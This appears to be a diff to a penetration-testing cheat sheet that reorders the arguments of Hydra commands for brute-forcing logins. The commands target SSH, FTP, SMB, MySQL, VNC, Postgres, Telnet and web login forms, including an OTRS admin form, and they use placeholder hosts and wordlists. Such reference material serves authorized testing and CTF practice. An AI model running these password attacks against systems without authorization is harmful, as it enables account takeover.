@@ -281,7 +281,7 @@ $ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 ```c
 $ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 $ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
-$ hydra -C /PATH/TO/WORDLIST/<FILE> <RHOST> ftp
+$ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
 ```
 
 ### Proxy
@@ -294,58 +294,54 @@ $ unset HYDRA_PROXY
 ### SSH
 
 ```c
-$ hydra -L usernames.txt -P passwords.txt <RHOST> ssh -V
-$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> -t 4 ssh
+$ hydra <RHOST> -L usernames.txt -P passwords.txt ssh -V
+$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> ssh -t 4
 ```
 
 ### FTP
 
 ```c
-$ hydra -L usernames.txt -P passwords.txt <RHOST> ftp -V -f
+$ hydra <RHOST> -L usernames.txt -P passwords.txt ftp -V -f
 ```
 
 ### SMB
 
 ```c
-$ hydra -L usernames.txt -P passwords.txt <RHOST> smb -V -f
+$ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
 ```
 
 ### MySQL
 
 ```c
-$ hydra -L usernames.txt -P passwords.txt <RHOST> mysql -V -f
+$ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
 ```
 
 ### VNC
 
 ```c
-$ hydra -P passwords.txt <RHOST> vnc -V
+$ hydra <RHOST> -P passwords.txt vnc -V
 ```
 
 ### Postgres
 
 ```c
-$ hydra -L usernames.txt -P passwords.txt <RHOST> postgres -V
+$ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
 ```
 
 ### Telnet
 
 ```c
-$ hydra -L usernames.txt -P passwords.txt <RHOST> telnet -V
-```
-
-### HTTP
-
-```c
-$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+$ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
 ```
 
 ### Webform
 
 ```c
-$ hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>
-$ hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
-$ hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
+$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
+$ hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
+$ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
 ```
 
 ## John
